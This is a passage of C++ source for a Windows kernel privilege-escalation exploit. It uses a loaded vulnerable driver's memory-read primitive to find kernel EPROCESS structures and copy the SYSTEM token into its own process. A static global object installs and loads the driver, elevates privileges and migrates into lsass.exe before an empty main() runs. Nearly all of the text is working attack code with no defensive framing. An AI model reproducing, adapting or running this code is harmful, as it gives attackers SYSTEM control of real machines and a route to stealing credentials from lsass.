    PRTL_PROCESS_MODULES ModuleInfo; // Store modules
    uintptr_t ntoskrnlBaseAddress = NULL;   // Kernel base address

    // Leak ntoskrnl base address using NtQuerySystemInformation
    ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!ModuleInfo) {
        //printf("[!] Error allocating module memory! Error Code: %lu", GetLastError());
        Driver.Shutdown();
        return -1;
    }

    // Call NtQuerySystemInformation and ask for the System module list.
    if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, ModuleInfo, 1024 * 1024,
        NULL))) // 11 = SystemModuleInformation
    {
        //printf("\n[!] Error: Unable to query module list (%#x)\n", status);

        VirtualFree(ModuleInfo, 0, MEM_RELEASE);
        Driver.Shutdown();
        return -1;
    }

    // Iterate through module list till we find the Kernel base address.
    // We do this by iterating through the list till we find a module named "ntoskrnl.exe" - this is the Kernel.
    for (int i = 0; i < ModuleInfo->NumberOfModules; i++) {
        if (!strcmp((const char*)ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName,
            "ntoskrnl.exe")) {
            ntoskrnlBaseAddress = (uintptr_t)ModuleInfo->Modules[i].ImageBase;
            break;
        }
    }

    // Clear that buffer now we don't need it.
    VirtualFree(ModuleInfo, 0, MEM_RELEASE);

    //std::cout << "[>] ntoskrnl.exe base address: " << std::hex << ntoskrnlBaseAddress << std::dec << std::endl;

    // These tokens will need updating if you are on a different version of Windows!
    // The offsets can be found here: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
    uintptr_t TokenOffset = 0x04B8; // Windows 10 21H2+ and Windows 11 only
    uintptr_t PIDOffset = 0x0440; // Windows 10 21H2+ and Windows 11 only
    uintptr_t ActiveProcessLinksOffset = 0x0448; // Windows 10 21H2+ and Windows 11 only

    // Fetch Kernel EPROCESS/KPROCESS
    // Get NTOS module address by loading it
    HMODULE ntos = LoadLibrary(L"ntoskrnl.exe");
    // Get function address
    auto PsInitialSystemProcessOffsetAddr = (uint64_t)GetProcAddress(ntos, "PsInitialSystemProcess");
    // Get offset
    auto offset = PsInitialSystemProcessOffsetAddr - (uint64_t)ntos;
    // Rebase to get Kernel address
    auto realPsInitialSystemProcessAddr = offset + ntoskrnlBaseAddress;
    // Read the EPROCESS pointer to get real address using our exploit
    uint64_t PsInitialSystemProcessEPROCESS;
    Driver.read_memory_raw(
        (void*)realPsInitialSystemProcessAddr,
        &PsInitialSystemProcessEPROCESS,
        sizeof(PsInitialSystemProcessEPROCESS),
        processHandle
    );

    //std::cout << "[>] PsInitialSystemProcess EPROCESS Address: " << std::hex << PsInitialSystemProcessEPROCESS
    //    << std::dec << std::endl;

    // Read the PID of the System
    DWORD systemPID;
    Driver.read_memory_raw(
        (void*)(PsInitialSystemProcessEPROCESS + PIDOffset),
        &systemPID,
        sizeof(systemPID),
        processHandle
    );

    // This is usually always 4.
    //std::cout << "[>] System PID: " << systemPID << std::endl;

    // Steal the System process token address using our exploit.
    uint64_t SystemToken;
    Driver.read_memory_raw(
        (void*)(PsInitialSystemProcessEPROCESS + TokenOffset),
        &SystemToken,
        sizeof(SystemToken),
        processHandle
    );
    //std::cout << "[>] System Token: " << std::hex << SystemToken << std::dec << std::endl;

    // Spawn a new shell and save its PID. We will elevate this shell to nt authority\system.
    //std::cout << "[-] Spawning a new shell that will be elevated to nt authority\\system!" << std::endl;

    // Save the PID for later.
    DWORD OurShellPID = GetCurrentProcessId();

    //std::cout << "[-] Our shell's PID: " << OurShellPID << std::endl;

    // Initiate our variables.
    LIST_ENTRY activeProcessLinkList;
    uint64_t NextProcessEPROCESSBlock = PsInitialSystemProcessEPROCESS;
    Driver.read_memory_raw(
        (void*)(PsInitialSystemProcessEPROCESS + ActiveProcessLinksOffset),
        &activeProcessLinkList,
        sizeof(activeProcessLinkList),
        processHandle
    );
    // You can fetch every single process' EPROCESS block from this original Kernel list, we iterate through it till we find our shell's PID.
    while (true) {
        DWORD processPID;
        NextProcessEPROCESSBlock = (uint64_t)activeProcessLinkList.Flink - ActiveProcessLinksOffset;
        // Fetch PID and compare it
        Driver.read_memory_raw(
            (void*)(NextProcessEPROCESSBlock + PIDOffset),
            &processPID,
            sizeof(processPID),
            processHandle
        );
        // std::cout << "Found PID: " << processPID << std::dec << " With EPROCESS Addr: " << std::hex << NextProcessEPROCESSBlock << std::dec << std::endl;
        if (processPID == OurShellPID) {
            //std::cout << "[>] Found our shell's EPROCESS address: " << std::hex << NextProcessEPROCESSBlock << std::dec
               // << std::endl;
            uint64_t OurShellsToken;
            Driver.read_memory_raw(
                (void*)(NextProcessEPROCESSBlock + TokenOffset),
                &OurShellsToken,
                sizeof(OurShellsToken),
                processHandle
            );
            //std::cout << "[>] Found our shell's current Process Token: " << std::hex << OurShellsToken << std::dec
                //<< std::endl;
            // Overwrite our shell's Process Token with the System's Process Token, to elevate our privilege!
            Driver.read_memory_raw(
                (void*)&SystemToken,
                (void*)(NextProcessEPROCESSBlock + TokenOffset),
                sizeof(SystemToken),
                processHandle
            );
            break;
        }
        // Fetch next EPROCESS block, in case we didn't find it.
        Driver.read_memory_raw(
            (void*)(NextProcessEPROCESSBlock + ActiveProcessLinksOffset),
            &activeProcessLinkList,
            sizeof(activeProcessLinkList),
            processHandle
        );
    }

    // Done!
    //std::cout << "[$] The newly opened shell should now be running as nt authority\\system!" << std::endl;

    // Close the handles.
    FreeLibrary(ntos);
    Driver.Shutdown();
};

class OriginalMain {
public:
    OriginalMain() {
        AdjustPrivs();
        DropDriverToFileSystem();
        InstallDriver();

        UNICODE_STRING puDriverRegFullPath;
        memset((void*)&puDriverRegFullPath, 0x0, sizeof(puDriverRegFullPath));

        RtlInitUnicodeString(&puDriverRegFullPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\sys_int");
        NTSTATUS dwLoadDriverStatus = NtLoadDriver(&puDriverRegFullPath);

        if (dwLoadDriverStatus >= 0) {
            //printf("!dwLoadDriverStatus!\n");
        }

        ElevatePriv();

        DWORD pid = findMyProc(L"lsass.exe");
        //printf("pid: %d\n", pid);
        Migrate(pid);
    }
};

OriginalMain obj;

int main() {
	return 0;
}
